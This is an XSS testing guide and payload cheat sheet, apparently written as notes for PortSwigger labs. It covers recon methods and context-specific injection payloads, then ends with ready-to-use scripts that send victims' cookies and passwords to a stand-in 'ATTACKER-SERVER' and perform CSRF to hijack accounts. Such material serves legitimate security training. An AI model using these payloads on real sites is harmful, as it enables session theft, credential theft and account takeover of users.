# Cross-site Scripting

## Summary

* [Recon for XSS](#recon)

* [Portswigger Labs Cheat Sheet / Payloads](#cheat-sheet)


## Recon

### Identify Reflected XSS

* **Identify Reflections of User Input**

    * Submit a unique random alphanumeric String into every parameter in each request, one at a time, and identify which parameters the application is reflecting back

    * Also submit the random String on any headers that the application seems to be processing 

* **Testing Reflection to Introduce XSS**

    * Review the source code to identify all the locations where the unique String is reflected 

    * Each occurrence needs to be tested separately

    * Depending on the context of where the String is being reflected, determine how the String needs to be modified in order to cause execution of a script

    * Use a proof-of-concept alert box to confirm that the script is executing in your browser


### Identify Stored XSS

* **Identify & Test for Stored XSS**

    * Submit a unique random String in every input field on the application, review all the application’s functionality to see if there are any more instances where the String in displayed back to the browser.  User-controllable data entered in 1 location can end up being reflected in many other arbitrary locations and each appearance may have different protective filters.

    * Identify if there is any input validation or encoding on the reflected data and determine how it needs to be modified to cause an execution of code

    * If you have access to 2 accounts ( E.g., normal user & admin user ), check if the injected data from the normal user appears in any of the functionality that an admin user can see

    * Make sure to complete the entire process when testing inputs that require multiple requests to be completed before they are stored.  Such as registering a user, placing an order, etc.

    * Test file upload functionalities for Stored XSS

    * For reflected XSS, it is straight forward to identify which parameters are vulnerable, as each parameter is tested individually, and the response is analyzed for any appearances of the input.

    * For stored XSS, if the same data is included in every input field, then in may be difficult to determine which parameter is the one responsible for the appearance of the data on the application.  To avoid this issue, submit different test Strings for each parameter when probing for Stored XSS.  Example: test123comment, test123username, test123address, etc.


### Identify DOM XSS

* Use the Browser to test for DOM-based XSS, as this will cause all the client-side scripts to execute.

* After mapping out the application, review all JavaScript client-side scripts for any “sources” in which a user can potentially control.

    * [Common Sources](https://portswigger.net/web-security/dom-based#common-sources)


* Review the code to identify what is being done with the user-controllable data, and if it can be used to cause JavaScript execution.  Identify if the data is being passed to dangerous “sinks”.

    * [Dangerous Sinks](https://portswigger.net/web-security/dom-based#which-sinks-can-lead-to-dom-based-vulnerabilities)


* Burp Suite built-in tool to test for DOM XSS:

    * [DOM Invader Tool](https://portswigger.net/burp/documentation/desktop/tools/dom-invader)


---
---

## Cheat Sheet

### Cheat Sheets

* https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection


### Initial Probing

* Submit a test String to all the input fields one at a time and identify the context in which the data is being returned in the responses.  For Stored XSS, we can add the parameter name to the payload.  The below test strings will verify how the application responds to angle brackets, parenthesis, quotation marks, single quotes.

    * **Test Strings:**

```html
<>"'/\`
```
```html
Test123parameterName
```
```html
<u>Test123</u>
```
```html
<script>alert("Test123")</script>
```
```html
<script>alert('Test123')</script>
```


* **Depending on that context, the following payloads can be used to break out of the context and potentially execute XSS:**


### No encoding implemented on the injected data

* If injected input is not be validated or encoded, we can simply use the standard XSS payloads below:

```html
<script>alert(1)</script>
```
```html
<img src=x onerror=alert(1)>
```

### Input is within an HTML attribute

* When the injected input is reflected within an HTML attribute, we need to close out the existing attribute/tag and introduce a new tag to execute JavaScript.

    * Example:  \<img src="*user-input*" \>

```html
"><script>alert(1)</script>
```

### DOM XSS – Input is within the .innerHTML() Sink

* If user-controllable source is passed to the .innerHTML() sink, then we can use an \<img\> tag, for example, to execute JavaScript.  The .innerHTML() property will not execute \<script\> tags.

```html
<img src=x onerror=alert(1)>
```


### Input is within an href attribute

* The JavaScript pseudo protocol can be used when the data is being reflected within a href attribute.

    * Example:  \<a href="*user-input*" \>

```html
javascript:alert(1)
```


### DOM XSS - AngularJS Expression

* If the application is using Angular JS, try injecting the following payload to the input fields and see if the expression is getting processed –> {{2+2}} = 4

```html
{{ this.constructor.constructor('alert("foo")')() }}
```


### Tags are being encoded but not recursively

* The application may be encoding the injected tags, but not in a recursive way.  The \<test\> tag will be properly encoded and rendered as data, but the rest of the payload will be executed as code.

```html
<test> <img src=x onerror=alert(1)>
```


### Tags are blocked except for custom ones

* If the application is blocking some common tags, we can inject custom ones.

```html
<input2 onmouseover=alert(1)>Test</input2>
```


### SVG markup payload

* Payload to try if the application is allowing to render \<svg\> tags, can be found on Portswigger XSS Cheat Sheet.

```html
<svg><animatetransform onbegin=alert(document.domain) attributeName=transform>
```


### Angle brackets encoded but data is reflected in attribute

* This will break out of the current attribute and introduce a new one that can execute JavaScript.  The last quotation mark is needed to ensure the syntax of the tag is correct.

    * Example:  \<input value=“*user-input*”\>

```html
Test123” autofocus onfocus=alert(1) x=” 
```


### JavaScript String with single quote and backslash escaped

* Use this payload to close the existing \<script\> tag and introduce a new tag that can execute JavaScript code.

    * Example:  \<script\> var x =’*user-input*’\</script\>

```html
</script><img src=x onerror=alert(1)>
```


### JavaScript String with angle brackets encoded

* This payload will terminate the existing String and close the statement, then comment out the rest of line.  Since the input is within \<script\> tags the payload will execute as JS.

    * Example:  \<script\> var x =’*user-input*’\</script\>

```html
‘; alert(1) //
```


### JavaScript String with angle brackets, double quotes encoded, and single quotes escaped

* The escape character itself, is not escaped, so when we supply it in the payload the application will end up escaping the escape character, instead of the single quote.  Since the input is already within \<script\> tags, the alert() will execute.

    * Example:  \<script\> var x =’*user-input*’\</script\>

* **Payload**
```html
\’; alert(1)//
```

* **End-Result**
```html
\\’;alert(1)//
```


### XSS is onclick event with angle brackets, double quotes encoded, and single/backslashes escaped

* Bypass server-side validation by submitting HTML entities.  The Browser will decode the HTML entities before the JavaScript is executed, which will break out of the context and execute the JavaScript.

    * Example:  \<a onclick=”var x=z; x.y(‘http://*user-input*’);” \>


* **Payloads**

```
&apos; ) ; alert(1) ;//
```
```
&apos; -alert(1)- &apos; 
```


### XSS into template literal `` 

* When the injected input is being reflected inside of backticks ` (template literals), we can execute expressions using the ${*data*} format. 

    * Example:  \<script\> var message=\`*user-input*\` \</script\>

```html
${alert(1)}
```


### Use XSS to steal user's cookies

* Inject the following payload in the vulnerable target application to steal a user's session cookie.  Here the "attacker server" could be burp collaborator for example.

```html
<script>
fetch('https://ATTACKER-SERVER', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```


### Use XSS to capture passwords

* Inject the following payload in the vulnerable target application to steal a user's credentials.  Here the "attacker server" could be burp collaborator for example.


```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://ATTACKER-SERVER',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```


### Use XSS to perform CSRF

* Inject the following payload in the vulnerable target application to force a user into changing their email address to test@test.com.  This can be combined with a "Forgot Password" function to take over a user's account.


```html
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
